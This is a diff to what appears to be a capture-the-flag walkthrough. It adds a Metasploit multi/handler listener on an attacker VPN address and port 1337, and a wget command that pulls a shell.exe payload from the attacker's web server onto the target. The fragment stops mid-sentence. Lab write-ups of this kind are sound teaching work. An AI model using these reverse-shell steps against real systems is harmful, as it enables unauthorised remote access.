@@ -217,7 +217,19 @@ Ill start a webserver to host it
 
 msf > use exploit/multi/handler 
 
-
+msf exploit(multi/handler) > set LHOST tun0
+LHOST => 10.10.14.61
+msf exploit(multi/handler) > set LPORT 1337
+LPORT => 1337
+msf exploit(multi/handler) > 
 ```
+
+Ill set all the correct options that were set in msfvenom
+
+```python
+wget http://10.10.14.61/shell.exe -o shell.exe
+```
+
+In the PWSA session i 
 
 
